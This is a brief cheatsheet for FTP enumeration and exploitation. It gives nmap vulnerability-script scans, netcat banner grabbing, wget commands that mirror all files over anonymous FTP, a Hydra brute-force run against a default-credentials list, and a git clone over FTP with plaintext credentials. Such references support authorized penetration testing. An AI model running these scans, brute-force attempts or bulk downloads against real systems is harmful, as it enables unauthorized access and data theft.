# FTP Exploitation and Enumeration Cheatsheet

## Nmap Vulnerability Script

```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.1.1
```

## Banner Grabbing

```bash
nc -vn 192.168.1.1 21
```

## FTP Commands

```bash
ls -a   # List all files
binary  # Switch to binary mode
ascii   # Switch to ASCII mode
```

## Download All Files

```bash
wget -m ftp://anonymous:anonymous@192.168.1.1
wget -m ftp://anonymous:anonymous@192.168.1.1:2121
wget -r ftp://anonymous:anonymous@192.168.1.1
wget -m --no-passive ftp://anonymous:anonymous@192.168.1.1
```

## Brute Force FTP with Hydra

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.1.1
```

## Cloning a Git Repository Over FTP

```bash
git clone ftp://john:password123@test.local:21/.git
